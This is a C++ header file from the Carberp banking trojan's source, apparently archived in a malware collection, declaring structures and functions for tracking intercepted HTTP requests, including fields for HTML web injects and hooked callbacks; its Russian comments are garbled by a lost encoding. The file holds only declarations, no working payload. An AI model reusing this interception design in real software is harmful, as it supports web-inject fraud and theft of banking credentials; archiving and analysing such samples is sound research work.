/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */

#ifndef RequestsH
#define RequestsH
//---------------------------------------------------------------------------

#include <windows.h>

#include "BotClasses.h"
#include "BotHTTP.h"
#include "BotClasses.h"


//typedef struct TRequest *PRequest;

typedef void(*TRequestEvent)(LPVOID);

typedef struct TRequestList
{
	PList Items;                       // ����� ���������
	LPCRITICAL_SECTION Lock;           // ���������� ������
	TRequestEvent OnInitializeExtData;
	TRequestEvent OnFreeExtData;
} *PRequestList;


typedef struct TRequest
{
	LPVOID Owner;        // ������������� ��������� �������
	THTTPMethod Method;  // �������� �������� ������
	PCHAR URL;           // ����� ����� � �������� �������������� ������
	PCHAR Optional;      // ���� ������ �������
	PCHAR ContentType;   // ��� ������������ ���������
    DWORD ContentLength; // ����� ����������� ������
	bool SupportPostData;// ������� ��������������� ��������� ����

	LPBYTE Buffer;       // ����� �������� ������
	DWORD BufferSize;    // ������ ������ �������� ������
	DWORD ReadedSize;    // ��������� ����


	DWORD SavedSize;
	DWORD SaveReturned;

	DWORD Position;      // ������� ������ ������
	bool FileReaded;     // ������� ����, ��� ���� ��������
    bool ConnectionClosed;// ���������� � �������� �������

	bool IsInject;       // ������� ������� �������� ��� �������
	PList Injects;       // ������ �������� (�������� ���� PHTMLInject)
	bool Injected;       // ������� ����, ��� ������ ��� ���������

	HANDLE Event;         // ������� ��������� ����� �������� ����� �� ��������� ������� �����������
	HANDLE AllowClose;    // ������� ��������� ����� ����� �������� ����������

	LPVOID OldCallback;	 // ��������� �� ���������� ����� �������� �����  (��� �������� ����������)
	LPVOID OldContext;   //  ��������� �� ���������� �������� �������� ���������� (��� �������� ����������)

	PMemBlockList ReceiveList; // ������ ����������� ������
	PMemBlock ReceiveBuf;      // ����� ��������

	bool FirstHandled;   // ������� ��������� ������ ������� ������ (��� IE)
	DWORD Entry;
	//------------------------------------------//

	LPVOID ExtData;     // �������������� ������ �������
	DWORD Flags;        // �������������� �����
	bool HeaderHandled; // ������� ������������� ���������
    DWORD HeaderSize;   // ������ ��������� ������
	//
	PRequestList List; // ������ �������� ����������� �������
} *PRequest;


//----------------------------------------------------------------------------
//  Request - ����� ������� ��� ������ � ���������
//----------------------------------------------------------------------------
namespace Request
{
	// ������ ������ ��������
	PRequestList CreateList(TRequestEvent OnInitExtData, TRequestEvent OnFreeExtData);

	// ���������� ������ ��������
	void FreeList(PRequestList List);

	// �������� ������. ���� ������ ��� ��������� Owner ����������, �� �����
	// ��������� ��������� �� ����. ��������� ���������
	// Existed ���� ������ ������ ����������� �� ������ ��  �����
	PRequest Add(PRequestList List, LPVOID Owner, bool *Existed = NULL);

	// ����� ������ ��� ���������
	PRequest Find(PRequestList List, LPVOID Owner);

	// ������� ������
	DWORD Delete(PRequestList List, LPVOID Owner);

	// �������� ������
	void Clear(PRequest R);

	// ���������������� ������ ��� �������� ���������
	void InitializeReceiveData(PRequest R);

	// ������� �������� ����������� ������ � ����� �������
	// � ����������� ���������� ��� �������� ���������
	void CloseReceiveData(PRequest R);


	// �������� ��������� ������ ������
	DWORD GetNextDataPart(PRequest Request, LPVOID Buf, DWORD BufSize, bool FreeBuf);

	// ���������� ������ �������
	void SetBuffer(PRequest R, LPBYTE NewBuf, DWORD Size);

	void inline Lock(PRequestList List);
	void inline Unlock(PRequestList List);
}


//---------------------------------------------------------------------------
#endif
